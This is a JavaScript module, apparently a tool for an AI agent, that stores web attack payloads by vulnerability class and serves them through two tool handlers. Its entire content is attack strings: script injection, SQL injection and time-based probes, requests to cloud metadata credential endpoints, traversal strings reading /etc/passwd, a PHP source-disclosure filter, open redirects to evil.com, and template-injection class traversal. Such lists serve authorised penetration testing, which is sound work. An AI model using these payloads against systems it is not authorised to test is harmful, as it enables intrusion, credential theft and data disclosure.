import { z } from 'zod';

const PAYLOAD_DB = {
  xss: {
    description: 'Cross-Site Scripting payloads',
    payloads: [
      '<script>alert(1)</script>',
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '"><img src=x onerror=alert(document.domain)>',
      '<body onload=alert(1)>',
      '{{7*7}}',  // template injection probe
    ],
  },
  sqli: {
    description: 'SQL Injection payloads',
    payloads: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR 1=1--",
      "1' ORDER BY 1--",
      "1' ORDER BY 2--",
      "1' UNION SELECT NULL--",
      "' AND SLEEP(5)--",
      "'; WAITFOR DELAY '0:0:5'--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    ],
  },
  ssrf: {
    description: 'Server-Side Request Forgery payloads',
    payloads: [
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://100.100.100.200/latest/meta-data/',
      'http://127.0.0.1/',
      'http://localhost/',
      'http://[::1]/',
      'file:///etc/passwd',
      'dict://127.0.0.1:6379/info',
    ],
  },
  idor: {
    description: 'IDOR / Broken Object Level Authorization test patterns',
    payloads: [
      'Increment/decrement the ID in the URL by 1',
      'Replace your user ID with another known user ID',
      'Try ID=0, ID=null, ID=undefined',
      'Try negative IDs: ID=-1',
      'Try GUID enumeration with known UUIDs',
      'Try accessing /api/v1/users/me endpoint without auth token',
    ],
  },
  lfi: {
    description: 'Local File Inclusion payloads',
    payloads: [
      '../../../etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '/etc/passwd',
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      'php://filter/convert.base64-encode/resource=index.php',
    ],
  },
  open_redirect: {
    description: 'Open redirect payloads',
    payloads: [
      '//evil.com',
      '//evil.com/%2F..',
      'https://evil.com',
      '/\\evil.com',
      '/%09/evil.com',
      'javascript:alert(1)',
      '//google.com%40evil.com',
    ],
  },
  ssti: {
    description: 'Server-Side Template Injection detection payloads',
    payloads: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '*{7*7}',
      '{{config}}',
      "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
  },
};

export const payloadTools = [
  {
    name: 'payload_get',
    description: 'Get payloads for a specific vulnerability class.',
    inputSchema: z.object({
      type: z.enum(Object.keys(PAYLOAD_DB)).describe('Vulnerability class'),
    }),
    handler: async ({ type }) => {
      const db = PAYLOAD_DB[type];
      return { type, description: db.description, count: db.payloads.length, payloads: db.payloads };
    },
  },
  {
    name: 'payload_list_types',
    description: 'List all available payload categories.',
    inputSchema: z.object({}),
    handler: async () => {
      const types = Object.entries(PAYLOAD_DB).map(([k, v]) => ({
        type: k,
        description: v.description,
        count: v.payloads.length,
      }));
      return { types };
    },
  },
];
